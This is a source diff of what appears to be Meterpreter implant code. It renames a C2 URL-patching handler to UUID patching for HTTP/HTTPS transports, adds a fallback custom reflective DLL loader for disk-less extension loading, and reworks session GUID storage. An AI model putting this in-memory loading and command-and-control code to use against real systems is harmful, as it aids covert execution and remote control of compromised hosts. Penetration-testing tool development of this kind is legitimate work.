@@ -2,6 +2,7 @@
 #include "common_metapi.h"
 #include "common_exports.h"
 #include "server_pivot.h"
+#include "extension_loader.h"
 
 #define GetProcAddressByOrdinal(mod, ord) GetProcAddress(mod, MAKEINTRESOURCEA(ord))
 #define GetProcAddressByOrdinalR(mod, ord) GetProcAddressR(mod, MAKEINTRESOURCEA(ord))
@@ -22,7 +23,7 @@ DWORD request_core_get_session_guid(Remote* remote, Packet* packet);
 DWORD request_core_set_session_guid(Remote* remote, Packet* packet);
 DWORD request_core_set_uuid(Remote* remote, Packet* packet);
 DWORD request_core_async_mode(Remote* remote, Packet* packet);
-BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result);
+BOOL request_core_patch_uuid(Remote* remote, Packet* packet, DWORD* result);
 
 // Dispatch table
 Command customCommands[] =
@@ -36,7 +37,7 @@ Command customCommands[] =
 	COMMAND_REQ(COMMAND_ID_CORE_PIVOT_ADD, request_core_pivot_add),
 	COMMAND_REQ(COMMAND_ID_CORE_PIVOT_REMOVE, request_core_pivot_remove),
 	COMMAND_REQ(COMMAND_ID_CORE_ASYNC_MODE, request_core_async_mode),
-	COMMAND_INLINE_REP(COMMAND_ID_CORE_PATCH_URL, request_core_patch_url),
+	COMMAND_INLINE_REP(COMMAND_ID_CORE_PATCH_UUID, request_core_patch_uuid),
 	COMMAND_TERMINATOR
 };
 
@@ -107,21 +108,19 @@ BOOL ext_cmd_callback(LPVOID pState, LPVOID pData)
 	return FALSE;
 }
 
-BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result)
+BOOL request_core_patch_uuid(Remote* remote, Packet* packet, DWORD* result)
 {
 	// this is a special case because we don't actually send
 	// response to this. This is a brutal switch without any
 	// other forms of comms, and this is because of stageless
 	// payloads
-	if (remote->transport->type == METERPRETER_TRANSPORT_TCP)
-	{
-		// This shouldn't happen.
-		*result = ERROR_INVALID_STATE;
-	}
-	else
+	*result = ERROR_INVALID_STATE;
+	if (remote->transport->type == METERPRETER_TRANSPORT_HTTPS || remote->transport->type == METERPRETER_TRANSPORT_HTTP)
 	{
 		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
-		ctx->new_uri = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
+		SAFE_FREE(ctx->uuid);
+		ctx->uuid = packet_get_tlv_value_wstring(packet, TLV_TYPE_C2_UUID);
+		dprintf("[PATCH UUID] New UUID is %S", ctx->uuid);
 		*result = ERROR_SUCCESS;
 	}
 	return TRUE;
@@ -228,6 +227,7 @@ DWORD stagelessinit_extension(UINT extensionId, LPBYTE data, DWORD dataSize)
 	}
 	return ERROR_SUCCESS;
 }
+
 
 /*
  * @brief Load an extension from the given library handle.
@@ -376,12 +376,20 @@ DWORD request_core_loadlib(Remote *remote, Packet *packet)
 			// If the library is not to be stored on disk, 
 			if (!(flags & LOAD_LIBRARY_FLAG_ON_DISK))
 			{
-				LPCSTR reflectiveLoader = packet_get_tlv_value_reflective_loader(packet);
-  dprintf("[LOADLIB] here 7");
+        dprintf("[LOADLIB] here 7");
 
-				// try to load the library via its reflective loader...
-				library = LoadLibraryR(dataTlv.buffer, dataTlv.header.length, reflectiveLoader);
-  dprintf("[LOADLIB] here 8");
+        LPCSTR reflectiveLoader = packet_get_tlv_value_reflective_loader(packet); 
+        library = LoadLibraryR(dataTlv.buffer, dataTlv.header.length, reflectiveLoader);
+
+        if(!library)
+        {
+          dprintf("[LOADLIB] Calling new custom reflective loader");
+          // try to load the library via the reflective loader...
+          LoadReflectively((ULONG_PTR)dataTlv.buffer, &library);
+        }
+
+				 dprintf("[LOADLIB] Reflective Loader returned, library is %p", library);
+				 
 				if (library == NULL)
 				{
 					// if that fails, presumably besause the library doesn't support
@@ -456,7 +464,7 @@ DWORD request_core_set_uuid(Remote* remote, Packet* packet)
 
 	if (newUuid != NULL)
 	{
-		memcpy(remote->orig_config->session.uuid, newUuid, UUID_SIZE);
+		memcpy(remote->uuid, newUuid, UUID_SIZE);
 	}
 
 	if (response)
@@ -478,7 +486,7 @@ DWORD request_core_get_session_guid(Remote* remote, Packet* packet)
 	Packet* response = packet_create_response(packet);
 	if (response)
 	{
-		packet_add_tlv_raw(response, TLV_TYPE_SESSION_GUID, &remote->orig_config->session.session_guid, sizeof(GUID));
+		packet_add_tlv_raw(response, TLV_TYPE_SESSION_GUID, remote->session_guid, sizeof(remote->session_guid));
 		packet_transmit_response(ERROR_SUCCESS, remote, response);
 	}
 	return ERROR_SUCCESS;
@@ -498,7 +506,7 @@ DWORD request_core_set_session_guid(Remote* remote, Packet* packet)
 
 	if (sessionGuid != NULL)
 	{
-		memcpy(remote->orig_config->session.session_guid, sessionGuid, sizeof(GUID));
+		memcpy(remote->session_guid, sessionGuid, sizeof(GUID));
 	}
 	else
 	{
